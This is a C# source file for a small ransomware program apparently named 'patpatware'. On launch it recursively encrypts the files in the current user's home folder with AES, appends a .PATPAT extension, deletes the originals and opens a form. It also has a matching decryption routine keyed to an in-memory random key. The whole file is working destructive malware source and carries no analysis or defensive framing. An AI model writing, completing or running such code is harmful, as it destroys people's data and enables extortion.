using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;

namespace patpatware
{
    static class Program
    {

        private static byte[] key = generatekey();
        public static string currentUser = Environment.UserName;

        [STAThread]
        static void Main()
        {
            var dir = @"C:\Users\" + currentUser;

            //Encrypt all files in C:\Users\USERNAME\ subdirectories
            scanFilesForEncryption(dir);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Main());
        }

        private static void scanFilesForEncryption(string dir)
        {
            foreach (string file in Directory.GetFiles(dir))
            {
                try
                {
                    Encryption(file, file + ".PATPAT");
                    File.Delete(file);
                }
                catch { }
            }

            foreach (string subDir in Directory.GetDirectories(dir))
            {
                try
                {
                    char[] chDir = subDir.ToCharArray();
                    var chLastDir = new List<char>();

                    for (int i = 0; i < chDir.Length; i++)
                    {
                        chLastDir.Add(chDir[i]);

                        if (Convert.ToByte(chDir[i]) == 92)
                        {
                            chLastDir.Clear();
                        }
                    }

                    Console.WriteLine(chLastDir.ToString());

                    if (subDir != @"C:\Users\" + currentUser + @"\AppData" && chLastDir.ToString() != "patpatware")
                    {
                        scanFilesForEncryption(subDir);
                    }
                }

                catch { }
            }

        }


        //Method that scan for encrypted files
        public static void scanFilesForDecryption(string dir)
        {
            foreach (string file in Directory.GetFiles(dir))
            {
                char[] chFile = file.ToCharArray();
                string extension = null;

                for (int i = chFile.Length - 7; i < chFile.Length; i++)
                {
                    extension += chFile[i];
                }

                if (extension == ".PATPAT")
                {
                    string outputFile = null;

                    for (int i = 0; i < chFile.Length - 7; i++)
                    {
                        outputFile += chFile[i];
                    }

                    try
                    {
                        Decryption(file, outputFile);
                        File.Delete(file);
                    }

                    catch { }
                }
            }

            foreach (string subDir in Directory.GetDirectories(dir))
            {
                try
                {
                    scanFilesForDecryption(subDir);
                }

                catch { }
            }
        }

        //Method that decrypts files
        private static void Decryption(string inputFile, string outputFile)
        {
            FileStream fs = new FileStream(inputFile, FileMode.Open);

            RijndaelManaged RM = new RijndaelManaged();

            CryptoStream cs = new CryptoStream(fs, RM.CreateDecryptor(key, key), CryptoStreamMode.Read);
            FileStream fsOut = new FileStream(outputFile, FileMode.Create);

            int data = 0;
            while ((data = cs.ReadByte()) != -1) fsOut.WriteByte((byte)data);

            fsOut.Close();
            cs.Close();
            fs.Close();
        }

        //Method that encrypts files
        private static void Encryption(string inputFile, string outputFile)
        {
            string cryptFile = outputFile;
            FileStream fs = new FileStream(cryptFile, FileMode.Create);

            RijndaelManaged RM = new RijndaelManaged();
            CryptoStream cs = new CryptoStream(fs, RM.CreateEncryptor(key, key), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(inputFile, FileMode.Open);

            int data;
            while ((data = fsIn.ReadByte()) != -1) cs.WriteByte((byte)data);

            fsIn.Close();
            cs.Close();
            fs.Close();
        }


        private static byte[] generatekey()
        {
            Random rnd = new Random();
            byte[] passkey = new byte[16];
            rnd.NextBytes(passkey);
            return passkey;
        }
    }
}
